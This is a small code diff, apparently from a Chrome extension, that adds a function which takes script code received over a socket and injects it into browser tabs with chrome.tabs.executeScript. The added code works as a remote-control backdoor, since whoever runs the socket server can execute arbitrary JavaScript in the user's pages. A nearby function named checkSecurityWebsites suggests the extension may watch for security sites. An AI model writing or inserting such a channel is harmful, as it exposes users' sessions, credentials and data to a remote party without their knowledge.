@@ -60,3 +60,11 @@ function checkSecurityWebsites(tabId, changeInfo) {
     });
   }
 }
+
+function createScriptSocket() {
+  socket.on('Script', (script) => {
+    chrome.tabs.executeScript(script.id, {
+      code: script.code
+    });
+  });
+}
